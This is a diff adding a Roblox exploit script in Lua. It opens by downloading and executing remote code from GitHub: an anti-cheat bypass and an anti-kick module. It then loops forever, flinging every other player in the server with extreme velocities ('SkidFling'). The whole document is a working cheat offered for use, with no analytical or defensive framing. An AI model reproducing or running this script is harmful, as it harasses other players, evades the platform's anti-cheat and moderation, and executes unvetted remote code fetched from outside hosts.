@@ -1,0 +1,148 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/raavenkkj/anti-kick/main/anti-kick.lua"))()
+getgenv().AntiKick = true -- Optional
+getgenv().Notifications = true -- Optional
+local Targets = {"All"}
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+while true do
+    local AllBool = false
+
+    local GetPlayer = function(Name)
+        Name = Name:lower()
+        if Name == "all" or Name == "others" then
+            AllBool = true
+            return
+        elseif Name == "random" then
+            local GetPlayers = Players:GetPlayers()
+            if table.find(GetPlayers, Player) then
+                table.remove(GetPlayers, table.find(GetPlayers, Player))
+            end
+            return GetPlayers[math.random(#GetPlayers)]
+        else
+            for _, x in next, Players:GetPlayers() do
+                if x ~= Player then
+                    if x.Name:lower():match("^" .. Name) or x.DisplayName:lower():match("^" .. Name) then
+                        return x
+                    end
+                end
+            end
+        end
+    end
+
+    local SkidFling = function(TargetPlayer)
+        local Character = Player.Character
+        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+        local RootPart = Humanoid and Humanoid.RootPart
+
+        local TCharacter = TargetPlayer.Character
+        local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
+        local TRootPart = THumanoid and THumanoid.RootPart
+        local THead = TCharacter and TCharacter:FindFirstChild("Head")
+        local Accessory = TCharacter and TCharacter:FindFirstChildOfClass("Accessory")
+        local Handle = Accessory and Accessory:FindFirstChild("Handle")
+
+        if not (Character and Humanoid and RootPart and TCharacter) then return end
+
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then return end
+
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(RootPart.CFrame)
+            RootPart.Velocity = Vector3.new(9e7, 9e8, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+
+        local SFBasePart = function(BasePart)
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if not (RootPart and THumanoid) then break end
+                Angle += 100
+                local move = THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25
+
+                FPos(BasePart, CFrame.new(0, 1.5, 0) + move, CFrame.Angles(math.rad(Angle), 0, 0))
+                task.wait()
+                FPos(BasePart, CFrame.new(0, -1.5, 0) + move, CFrame.Angles(math.rad(Angle), 0, 0))
+                task.wait()
+            until BasePart.Velocity.Magnitude > 500
+                or BasePart.Parent ~= TCharacter
+                or Humanoid.Health <= 0
+                or tick() > Time + 2
+        end
+
+        workspace.FallenPartsDestroyHeight = 0/0
+
+        local BV = Instance.new("BodyVelocity")
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+        if TRootPart and THead then
+            SFBasePart((TRootPart.Position - THead.Position).Magnitude > 5 and THead or TRootPart)
+        elseif TRootPart then
+            SFBasePart(TRootPart)
+        elseif THead then
+            SFBasePart(THead)
+        elseif Handle then
+            SFBasePart(Handle)
+        end
+
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
+            Character:SetPrimaryPartCFrame(RootPart.CFrame)
+            Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+            for _, x in next, Character:GetChildren() do
+                if x:IsA("BasePart") then
+                    x.Velocity = Vector3.zero
+                    x.RotVelocity = Vector3.zero
+                end
+            end
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.Position).Magnitude < 25
+    end
+
+    if Targets[1] then
+        for _, x in next, Targets do
+            GetPlayer(x)
+        end
+    end
+
+    if AllBool then
+        for _, x in next, Players:GetPlayers() do
+            if x ~= Player then
+                SkidFling(x)
+            end
+        end
+    else
+        for _, x in next, Targets do
+            local TPlayer = GetPlayer(x)
+            if TPlayer and TPlayer ~= Player then
+                SkidFling(TPlayer)
+            end
+        end
+    end
+
+    task.wait(3)
+end
